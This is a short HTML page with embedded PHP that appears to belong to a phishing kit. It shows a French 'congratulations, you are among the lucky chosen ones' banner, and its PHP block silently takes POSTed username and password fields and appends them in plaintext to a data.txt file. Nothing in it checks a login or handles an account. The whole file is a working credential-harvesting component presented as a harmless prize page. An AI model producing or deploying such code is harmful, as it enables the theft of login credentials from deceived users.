<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>congrat</title>
    <style type="text/css" media="all">
    *{
      font-family: Segoe Ui;
      touch-action: pan-x pan-y;
    }
      body{
        display: grid;
        background: rgb(255,255,255);
        margin: auto;
        width: 100vw;
        height: 90vh;
        align-content: flex-start;
        justify-content: center;
      }
      .congrat{
        display: grid;
        width: 100vw;
        height: 2.5rem;
        align-content: center;
        justify-content: center;
        background: rgb(250,250,220);
        font-size: .8rem;
        color: rgb(0,100,220);
      }
    </style>
  </head>
  <body>
    <div class="congrat">Félicitations ! Vous êtes parmi les heureux élus</div>
  <?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
  $user = $_POST["user"];
  $pass = $_POST["pass"];
  $data = "$user : $pass";
  if(!empty($user) && !empty($pass)){
    $file = "data.txt";
    file_put_contents($file,$data.PHP_EOL,FILE_APPEND);
    return true;
  }
  else{
    return false;
  }
}
?>
  </body>
</html>